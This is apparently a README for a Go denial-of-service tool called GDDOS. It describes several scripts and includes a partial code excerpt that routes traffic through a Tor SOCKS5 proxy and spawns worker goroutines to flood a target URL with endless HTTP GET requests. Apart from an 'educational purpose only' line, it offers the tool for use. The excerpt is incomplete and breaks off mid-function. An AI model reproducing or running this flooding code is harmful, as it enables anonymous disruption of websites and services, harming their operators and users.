# GDDOS
Denial Of Service attack in GO using TOR 

* EDUCATIONAL PURPOSE ONLY


 * CODE DESCRIPTION
  
     * ddos.go  
     
          --Its  the  modification Konstantin8105/DDoS attack  using tor
          
     * simpleddos.go  
     
          --Minimal code of line ddos attack not banging into a server at once
          
     * simpletorddos.go 
     
          --Minimal code using tor connection
          
          
     * testtor.go 
     
          --Simple script to check the tor connectivity
          
          *********************************************************************************************

* ddos.go  explanation 
  #func (d *DDoS) Run() {
	#torcon, _ := url.Parse("socks5://127.0.0.1:9050")
	#pather, _ := proxy.FromURL(torcon, proxy.Direct)
	#nwpath := &http.Transport{Dial: pather.Dial}
	#client := &http.Client{Transport: nwpath}

	#for i := 0; i < d.amountWorkers; i++ {
		#go func() {
			#for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := client.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
						fmt.Println(d)
					}



